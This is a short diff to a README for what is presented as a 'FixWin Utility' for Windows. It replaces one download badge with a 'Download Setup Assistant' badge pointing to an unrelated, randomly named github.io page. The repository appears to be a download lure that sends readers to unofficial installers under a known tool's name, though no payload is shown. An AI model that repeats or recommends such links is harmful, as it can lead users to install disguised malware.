@@ -5,13 +5,7 @@
 
 <h1 align="center">🛠️ FixWin Utility (Windows)</h1>
 
-<p align="center">
-  <a href="https://fixwin-utility-download-for-windows.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20FixWin%20Utility-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white"
-         alt="Download FixWin Utility for Windows"
-         style="width:560px;height:44px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://dechambeautomikaylo.github.io/.github/fixwin-utility-for-windows)
 
 <p align="center">
   <img src="https://img.utdstc.com/screen/610/92e/61092e764794e9c209b7cd6ba416731c60fbe968a426b83dc40e801f353991a6:600" alt="FixWin Utility Interface Preview" width="700" />
